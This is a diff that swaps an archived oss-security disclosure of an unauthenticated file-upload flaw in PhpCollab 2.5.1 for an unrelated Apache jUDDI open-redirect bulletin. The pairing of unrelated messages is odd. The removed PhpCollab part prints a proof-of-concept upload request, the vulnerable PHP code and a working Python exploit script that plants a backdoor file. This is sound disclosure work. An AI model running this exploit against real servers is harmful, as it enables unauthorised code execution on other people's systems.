@@ -1,141 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/29/7
-Message-ID: <f608373d-34ce-2e55-a04f-965305be5ea9@sysdream.com>
-Date: Fri, 29 Sep 2017 16:31:40 +0200
-From: Sysdream Labs <labs@...dream.com>
-To: fulldisclosure@...lists.org
-Cc: oss-security@...ts.openwall.com
-Subject: [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/18/10
+Message-ID: <CALLT8khyoJnN0vcmNna9Ah6mODNdfeYiMFuNNfNHs7t_=Zuuwg@mail.gmail.com>
+Date: Thu, 18 May 2017 19:27:58 -0400
+From: "Alex O'Ree" <alexoree@...che.org>
+To: oss-security@...ts.openwall.com,  "user@...di.apache.org" <user@...di.apache.org>, dev@...di.apache.org, bugtraq@...urityfocus.com,  awillard@...egroundsecurity.com, pavelp@...hat.com
+Subject: jUDDI Security Bulletin
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-6090] PhpCollab 2.5.1 Arbitrary File Upload (unauthenticated)
+[CVEID]:CVE-2015-5241
+[PRODUCT]:Apache jUDDI
+[VERSION]: 3.1.2, 3.1.3, 3.1.4, and 3.1.5 utilize the portlets based
+user interface also known as 'Pluto', 'jUDDI Portal', 'UDDI Portal' or
+'uddi-console'
 
-## Description
+[PROBLEMTYPE]:Open Redirect
+[REFERENCES]:http://juddi.apache.org/security.html
 
-PhpCollab is an open source web-based project management system, that enables collaboration across the Internet.
-
-## Arbitrary File Upload
-
-The phpCollab code does not correctly filter uploaded file contents. An unauthenticated attacker may upload and execute arbitrary code.
-
-**CVE ID**: CVE-2017-6090
-
-**Access Vector**: remote
-
-**Security Risk**: Critical
-
-**Vulnerability**: CWE-434
-
-**CVSS Base Score**: 10 (Critical)
-
-**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-
-### Proof of Concept
-
-The following HTTP request allows an attacker to upload a malicious php file, without authentication.
-Thus, a file named after `$id.extension` is created.
-
-For example, a backdoor file can be reached at `http://phpCollab.lan/logos_clients/1.php`.
-
-```
-POST /clients/editclient.php?id=1&action=update HTTP/1.1
-Host: phpCollab.lan
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: multipart/form-data; boundary=---------------------------154934846911423734231554128137
-Content-Length: 252
-
------------------------------154934846911423734231554128137
-Content-Disposition: form-data; name="upload"; filename="backdoor.php"
-Content-Type: application/x-php
-
-<?php phpinfo(); ?>
-
------------------------------154934846911423734231554128137--
-```
+[DESCRIPTION]: After logging into the portal, the logout jsp page
+redirects the browser back to the login page after. It is feasible for
+malicious user to redirect the browser to an unintended web page. User
+session data, credentials, and auth tokens are cleared before the
+redirect.
 
 
-### Vulnerable code
+Mitigation:
 
-The vulnerable code is found in `clients/editclient.php`, line 63.
+1) Remove or disable the portlet's based user interface.
 
-```
-$extension = strtolower( substr( strrchr($_FILES['upload']['name'], ".") ,1) );
-if(@move_uploaded_file($_FILES['upload']['tmp_name'], "../logos_clients/".$id.".$extension"))
-{
-  chmod("../logos_clients/".$id.".$extension",0666);
-  $tmpquery = "UPDATE ".$tableCollab["organizations"]." SET extension_logo='$extension' WHERE id='$id'";
-  connectSql("$tmpquery");
-}
-```
+2) Upgrade to newer versions of jUDDI (v3.2 and newer) which is not
+affected by this issue
 
+3) If upgrading or disabling the portlet based user interface is not
+an option, the following can be used to resolve the issue. Modify the
+file located at "uddi-portlets/logout.jsp", replacing the following
+text
 
-### Exploit code
+> "String redirectURL = (String) request.getParameter("urlredirect");
+> if (redirectURL==null) redirectURL = "/pluto/Logout";
 
-```
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+with this text
+> String redirectURL = "/pluto/Logout";
 
-import os
-import sys
-import requests
-
-if __name__ == '__main__':
-    if (len(sys.argv) != 4):
-        print("Enter your target, userid and path for file upload like : python exploit.py http://www.phpCollabURL.lan 1 /tmp/test.php")
-        sys.exit(1)
-
-    target = "%s/clients/editclient.php?id=%s&action=update" % (sys.argv[1], sys.argv[2])
-    print("[*] Trying to exploit with URL : %s..." % target)
-    backdoor = {'upload': open(sys.argv[3], 'rb')}
-    r = requests.post(target, files=backdoor)
-    extension = os.path.splitext(sys.argv[3])[1]
-    link = "%s/logos_clients/%s%s" % (sys.argv[1], sys.argv[2], extension )
-    r = requests.get(link)
-    if r.status_code == 200:
-        print("[OK] Backdoor link : %s" % link)
-    else:
-        print("[FAIL]Problem (status:%s) (link:%s)" % (r.status_code, link))
-```
-
-## Solution
-
-Update to the latest version avalaible.
-
-## Affected versions
-
-* Version <= 2.5.1
-
-## Timeline (dd/mm/yyyy)
-
-* 27/08/2016 : Initial discovery.
-* 05/10/2016 : Initial contact.
-* 11/10/2016 : GPG Key exchange.
-* 19/10/2016 : Advisory sent to vendor.
-* 13/02/2017 : First fixes.
-* 15/02/2017 : Fixes validation by Sysdream.
-* 21/02/2017 : PhpCollab ask to wait before publish.
-* 21/06/2017 : New version has been released.
-* 29/09/2017 : Public disclosure.
-
-## Credits
-
-* Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)
-
--- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+No patches or releases are planned for the affected versions since
+jUDDI v3.2 replaced the user interface.
